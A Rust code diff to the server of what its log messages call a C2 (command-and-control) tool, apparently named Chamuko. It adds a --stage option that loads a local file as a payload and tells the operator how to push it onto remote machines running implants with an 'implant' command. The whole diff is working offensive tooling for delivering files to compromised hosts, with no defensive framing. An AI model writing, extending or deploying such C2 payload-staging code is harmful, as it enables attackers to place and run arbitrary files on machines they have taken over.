@@ -11,6 +11,8 @@ struct Args {
     listen: String,
     headless: bool,
     token: Option<String>,
+    /// Local file to stage for agents to pull with the `implant` command.
+    stage: Option<String>,
 }
 
 fn main() -> ExitCode {
@@ -23,6 +25,26 @@ fn main() -> ExitCode {
     };
 
     let state = Arc::new(Mutex::new(State::new()));
+
+    if let Some(path) = &args.stage {
+        let data = match std::fs::read(path) {
+            Ok(d) => d,
+            Err(e) => {
+                eprintln!("[c2] cannot read --stage {path}: {e}");
+                return ExitCode::FAILURE;
+            }
+        };
+        let name = std::path::Path::new(path)
+            .file_name()
+            .map(|n| n.to_string_lossy().to_string())
+            .unwrap_or_else(|| "payload".to_string());
+        let transfer = state.lock().unwrap().stage_download(&name, data.clone());
+        eprintln!(
+            "[c2] staged {name} ({} bytes) as transfer {transfer}",
+            data.len()
+        );
+        eprintln!("[c2] queue it with: implant {transfer} <remote-path>");
+    }
     let options = server::Options {
         listen: args.listen.clone(),
         token: args.token.clone(),
@@ -69,6 +91,7 @@ fn parse_args_from(args: &[String], env_token: Option<String>) -> Result<Args, S
     let mut listen = "0.0.0.0:8080".to_string();
     let mut headless = false;
     let mut token = env_token;
+    let mut stage: Option<String> = None;
     let mut i = 0;
     while i < args.len() {
         match args[i].as_str() {
@@ -89,6 +112,11 @@ fn parse_args_from(args: &[String], env_token: Option<String>) -> Result<Args, S
                 let value = args.get(i).ok_or("--token requires a value")?;
                 token = Some(value.clone()).filter(|t| !t.is_empty());
             }
+            "--stage" | "-S" => {
+                i += 1;
+                let value = args.get(i).ok_or("--stage requires a file path")?;
+                stage = Some(value.clone());
+            }
             "--headless" => headless = true,
             "--help" | "-h" => {
                 println!(
@@ -97,6 +125,7 @@ fn parse_args_from(args: &[String], env_token: Option<String>) -> Result<Args, S
                      --port <port>     shorthand for --listen 0.0.0.0:<port>\n\
                      --token <tok>     require this bearer token on every API call\n\
                                        (default: $CHAMUKO_TOKEN)\n\
+                     --stage <file>    stage a file for agents to pull (implant)\n\
                      --headless        run without the TUI\n\
                      --help            show this help"
                 );
@@ -118,6 +147,7 @@ fn parse_args_from(args: &[String], env_token: Option<String>) -> Result<Args, S
         listen,
         headless,
         token,
+        stage,
     })
 }
 
